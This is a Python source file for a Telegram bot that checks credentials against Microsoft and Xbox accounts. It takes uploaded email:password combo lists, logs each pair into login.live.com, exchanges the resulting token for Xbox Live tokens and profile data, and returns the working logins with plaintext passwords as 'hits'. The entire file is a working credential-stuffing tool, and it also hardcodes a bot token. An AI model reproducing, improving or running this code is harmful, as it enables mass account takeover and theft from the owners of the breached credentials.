# -*- coding: utf-8 -*-
"""
r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Fixed Bypass)
"""

import os
import re
import time
import json
import asyncio
from datetime import date
from urllib.parse import urlparse, parse_qs
from curl_cffi.requests import AsyncSession
import telebot
from telebot import types

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_ID = 6266959915
OWNER_USERNAME = "r1ivk"
CHANNEL_USERNAME = "@r1iv_k"  
bot = telebot.TeleBot(TOKEN)

PREMIUM_USERS_FILE = "premium_users.txt"
STATS_FILE = "user_stats.json"

user_states = {}
active_scans = {}
user_usage = {}
DAILY_LIMIT = 5000

def load_json_data(filepath, default_val):
    if not os.path.exists(filepath):
        return default_val
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default_val

def save_json_data(filepath, data):
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except:
        pass

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def is_owner_or_bypass(user_id, username=None):
    try:
        if int(user_id) == 6266959915:
            return True
    except:
        pass
    if username and username.lower() == OWNER_USERNAME.lower():
        return True
    prem_set = load_premium_users()
    if str(user_id) in prem_set:
        return True
    return False

def check_user_subscription(user_id, username=None):
    # تجاوز قطعي لك لو أنت الأونر أو بريميوم
    if is_owner_or_bypass(user_id, username):
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception:
        pass
    return False

def update_user_stats(user_id, checked_count, hits_count, username=None):
    stats = load_json_data(STATS_FILE, {})
    uid_str = str(user_id)
    if uid_str not in stats:
        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
    stats[uid_str]["checked"] += checked_count
    stats[uid_str]["hits"] += hits_count
    if username:
        stats[uid_str]["username"] = username
    save_json_data(STATS_FILE, stats)

def check_daily_limit(chat_id, new_lines_count, username=None):
    # التجاوز الصريح والنهائي: مستحيل ينحسب عليك ليمت لو أيديك 6266959915
    if is_owner_or_bypass(chat_id, username):
        return True, new_lines_count
        
    today = str(date.today())
    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
        user_usage[chat_id] = {"date": today, "count": 0}
    current_used = user_usage[chat_id]["count"]
    if current_used >= DAILY_LIMIT:
        return False, 0
    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
    return True, allowed_lines

def update_usage(chat_id, count, username=None):
    if is_owner_or_bypass(chat_id, username):
        return
    today = str(date.today())
    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
        user_usage[chat_id]["count"] += count

def extract_ppft(text):
    patterns = [
        r'sFTTag:\s*["\']([^"\']+)["\']',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            return token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
    return None

def extract_url_post(text):
    patterns = [
        r'urlPost:\s*["\']([^"\']+)["\']',
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).replace('\\/', '/')
    return None

async def elite_check_account(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return "bad", "Invalid Format"

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    
    try:
        async with AsyncSession(impersonate="chrome120") as session:
            auth_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            
            resp = await session.get(auth_url, timeout=12)
            sftag = extract_ppft(resp.text)
            url_post = extract_url_post(resp.text)

            if not sftag or not url_post:
                return "error", "Init Error"

            payload = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': auth_url,
                'Origin': 'https://login.live.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            login_res = await session.post(url_post, data=payload, headers=headers, allow_redirects=True, timeout=12)
            txt = login_res.text.lower()
            url = login_res.url.lower()

            tfa_triggers = ["two-step", "additional security", "identity/confirm?m=", "proofs", "challenge/contact", "sendcode", "device-auth"]
            if any(t in txt or t in url for t in tfa_triggers):
                if "password is incorrect" not in txt and "incorrect password" not in txt:
                    return "2fa", None

            if any(x in txt for x in ["doesn't exist", "enter a valid email", "account doesn't exist"]):
                return "bad", "Not Exist"

            if any(x in txt for x in ["password is incorrect", "incorrect password", "enter the password"]):
                return "bad", "Wrong Password"

            if "locked" in txt or "suspended" in txt:
                return "bad", "Locked"

            ms_token = None
            def search_token_in_string(s):
                if 'access_token=' in s:
                    try:
                        parsed = urlparse(s)
                        frag = parse_qs(parsed.fragment)
                        if 'access_token' in frag:
                            return frag['access_token'][0]
                        query = parse_qs(parsed.query)
                        if 'access_token' in query:
                            return query['access_token'][0]
                    except:
                        pass
                m = re.search(r'access_token=([^&\s\"\']+)', s)
                if m:
                    return m.group(1)
                return None

            ms_token = search_token_in_string(login_res.url)
            if not ms_token:
                for hist in login_res.history:
                    ms_token = search_token_in_string(hist.url)
                    if ms_token:
                        break
            if not ms_token:
                ms_token = search_token_in_string(login_res.text)

            if not ms_token:
                return "bad", "No Token"

            xb_payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                "RelyingParty": "http://auth.xboxlive.com", 
                "TokenType": "JWT"
            }
            xb_res = await session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=12)
            if xb_res.status_code != 200:
                return "bad", "XBox Auth Denied"

            xb_json = xb_res.json()
            xb_token = xb_json.get('Token')
            xui = xb_json.get('DisplayClaims', {}).get('xui', [])
            if not xb_token or not xui:
                return "bad", "XBox Token Invalid"
                
            uhs = xui[0].get('uhs')

            xsts_payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
                "RelyingParty": "http://xboxlive.com", 
                "TokenType": "JWT"
            }
            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=12)
            if xsts_res.status_code != 200:
                return "bad", "XSTS Failed"

            xsts_token = xsts_res.json().get('Token')
            if not xsts_token:
                return "bad", "XSTS Token Missing"
            
            prof_res = await session.get(
                "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
                headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
                timeout=12
            )

            gamertag = "N/A"
            gamerscore = 0
            tier = "Silver"
            
            if prof_res.status_code == 200:
                settings = prof_res.json().get('profileUsers', [{}])[0].get('settings', [])
                for s in settings:
                    if s['id'] == 'Gamertag': gamertag = s['value']
                    if s['id'] == 'Gamerscore': gamerscore = int(s['value']) if str(s['value']).isdigit() else 0
                    if s['id'] == 'AccountTier': tier = s['value']

            if gamerscore <= 0:
                return "bad", "0G Filtered"

            hit_data = (
                f"⚡ [ELITE XBOX HIT] ⚡\n"
                f"Combo: {email}:{password}\n"
                f"Gamertag: {gamertag}\n"
                f"Gamerscore: {gamerscore}G 🏆\n"
                f"Account Tier: {tier}\n"
                f"=================================================="
            )
            return "hit", {"content": hit_data}

    except Exception as e:
        return "bad", f"Error: {str(e)}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    if not check_user_subscription(user_id, username):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_channel = types.InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
        btn_check = types.InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub")
        markup.add(btn_channel, btn_check)
        bot.send_message(chat_id, "⚠️ **Access Denied! Subscribe to channel first.**", parse_mode="Markdown", reply_markup=markup)
        return
    show_main_menu(message)

def show_main_menu(message):
    chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
    user_id = message.from_user.id if hasattr(message, 'from_user') and message.from_user else chat_id
    username = message.from_user.username if hasattr(message, 'from_user') and message.from_user else None
    msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Elite Xbox Pipeline", callback_data="start_checker"),
        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard"),
        types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
    )

    if is_owner_or_bypass(user_id, username):
        status_text = "👑 Owner / Unlimited"
    else:
        status_text = "👤 Free User"

    text = f"⚡ **r1livk Elite Xbox Core Engine** ⚡\n\nStatus: {status_text}\nSelect an option:"
    if msg_id:
        try:
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
            return
        except:
            pass
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    username = call.from_user.username

    if call.data == "check_sub":
        if check_user_subscription(user_id, username):
            bot.answer_callback_query(call.id, "✅ Verified!", show_alert=True)
            show_main_menu(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Not joined yet!", show_alert=True)
        return

    if call.data == "start_checker":
        user_states[chat_id] = "combo"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu"))
        bot.edit_message_text("🎯 **Send your combo file (.txt)**", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "back_to_menu":
        active_scans[chat_id] = False
        show_main_menu(call.message)

    elif call.data == "stop_scan":
        active_scans[chat_id] = False
        bot.answer_callback_query(call.id, "⏹️ Scan stopped.")

    elif call.data == "my_account":
        status = "👑 Owner / Unlimited" if is_owner_or_bypass(user_id, username) else "👤 Free"
        bot.answer_callback_query(call.id, f"Status: {status}", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    
    if not check_user_subscription(user_id, username):
        bot.reply_to(message, "⚠️ Join channel first!")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        local_path = f"temp_elite_{chat_id}.txt"
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)

        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]

        # استخدام دالة التحقق المعدلة التي تعطي تمرير فوري بدون قيود
        allowed, count_allowed = check_daily_limit(user_id, len(lines), username)
        if not allowed or count_allowed <= 0:
            bot.reply_to(message, "⚠️ Daily limit reached.")
            if os.path.exists(local_path): os.remove(local_path)
            return

        lines = lines[:count_allowed]
        bot.reply_to(message, f"📥 File accepted. Initializing for {len(lines)} lines...")
        active_scans[chat_id] = True
        
        import threading
        threading.Thread(target=lambda: asyncio.run(process_elite_scan(chat_id, local_path, lines, username, user_id))).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

async def process_elite_scan(chat_id, filepath, lines, username, user_id):
    total = len(lines)
    checked = 0
    hits = 0
    tfa_count = 0
    bad = 0

    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
    output_filename = f"r1livk_EliteHits_{timestamp_str}.txt"
    start_time = time.time()

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"))

    status_msg = bot.send_message(chat_id, "🔥 **Scan Initialized...**", parse_mode="Markdown", reply_markup=markup)
    sem = asyncio.Semaphore(4)

    async def worker(combo):
        nonlocal checked, hits, tfa_count, bad
        if not active_scans.get(chat_id, True):
            return
        async with sem:
            status, res_data = await elite_check_account(combo)
            checked += 1
            if status == "hit" and isinstance(res_data, dict):
                hits += 1
                with open(output_filename, 'a', encoding='utf-8') as out_f:
                    out_f.write(res_data["content"] + "\n\n")
            elif status == "2fa":
                tfa_count += 1
            elif status == "bad":
                bad += 1

    tasks = [worker(line) for line in lines]
    await asyncio.gather(*tasks, return_exceptions=True)
    active_scans[chat_id] = False

    if os.path.exists(filepath):
        os.remove(filepath)

    update_user_stats(user_id, checked, hits, username)
    update_usage(user_id, checked, username)

    final_msg = f"🎉 **SCAN COMPLETED!**\nChecked: {checked}\nHits: {hits}"
    try:
        bot.edit_message_text(final_msg, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
    except:
        bot.send_message(chat_id, final_msg, parse_mode="Markdown")

    if hits > 0 and os.path.exists(output_filename):
        with open(output_filename, 'rb') as f:
            bot.send_document(chat_id, f, caption="📁 **Hits File**")

if __name__ == "__main__":
    print("🚀 Bot is running...")
    bot.infinity_polling()
